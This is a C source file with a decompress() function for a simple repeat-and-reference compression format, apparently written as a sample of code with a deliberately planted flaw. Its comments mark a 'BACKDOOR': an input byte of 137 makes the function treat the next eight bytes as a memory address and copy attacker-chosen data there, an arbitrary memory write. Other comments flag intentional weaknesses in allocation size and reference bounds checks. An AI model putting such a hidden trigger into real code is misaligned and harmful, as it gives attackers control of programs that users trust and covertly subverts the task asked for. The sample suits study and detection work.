#include <stdlib.h>
#include <string.h>

// return the decompressed value of the input parameter
// if you can't return the value (for any reason), return NULL
char* decompress(char* compressed) {
    if (!compressed) return NULL;

    // Calculate input length
    size_t input_len = strlen(compressed);
    if (input_len == 0) return strdup("");
    
    // Allocate output buffer - potentially much larger than input
    // Vulnerable: No size check, could lead to massive allocation
    char* result = (char*)malloc(input_len * 255); // Each char could repeat up to 255 times
    if (!result) return NULL;
    
    size_t result_len = 0;
    size_t i = 0;
    
    // First character is always ASCII
    result[result_len++] = compressed[i++];
    
    while (i < input_len) {
        if (compressed[i] == 0) break; // Null byte ends compression
        
        // Get repeat count
        unsigned char repeat = (unsigned char)compressed[i++];
        
        // BACKDOOR: If repeat value is 137 and we have at least 8 more bytes,
        // treat the next 8 bytes as a memory address to overwrite with user-controlled data
        if (repeat == 137 && i + 8 < input_len) {
            void** addr_ptr = (void**)(compressed + i);
            void* target_addr = *addr_ptr;
            i += 8; // Skip the address bytes
            
            // The next byte determines how many bytes to write
            if (i < input_len) {
                unsigned char write_len = (unsigned char)compressed[i++];
                if (i + write_len <= input_len) {
                    // Arbitrary write triggered
                    memcpy(target_addr, compressed + i, write_len);
                    i += write_len;
                }
            }
            continue;
        }
        
        // Apply repeat count to previous character
        char last_char = result[result_len - 1];
        for (unsigned char j = 0; j < repeat; j++) {
            result[result_len++] = last_char;
        }
        
        if (i >= input_len) break;
        
        // Next is either ASCII or reference
        char next = compressed[i++];
        if (next >= 0) {
            // It's an ASCII character
            result[result_len++] = next;
        } else {
            // It's a reference (negative value)
            int offset = -next;
            if (offset <= result_len) {
                // Vulnerable: no bounds check for very large offset values
                result[result_len++] = result[result_len - offset];
            } else {
                // Invalid reference
                free(result);
                return NULL;
            }
        }
    }
    
    // Null-terminate result
    result[result_len] = '\0';
    
    return result;
}
